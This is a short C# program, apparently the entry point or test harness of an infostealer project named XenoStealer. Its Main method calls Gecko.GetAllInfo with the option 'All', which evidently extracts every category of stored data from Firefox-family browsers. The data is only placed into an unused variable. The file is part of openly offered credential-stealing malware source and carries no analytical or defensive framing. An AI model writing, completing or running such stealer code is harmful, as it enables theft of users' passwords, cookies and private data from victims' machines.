using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using XenoStealer;

namespace XenoStealer
{
    class Program
    {
        public static void Main(string[] args)
        {
            var f = Gecko.GetAllInfo(DataExtractionStructs.GeckoBrowserOptions.All);
            var d = "";
        }
    }
}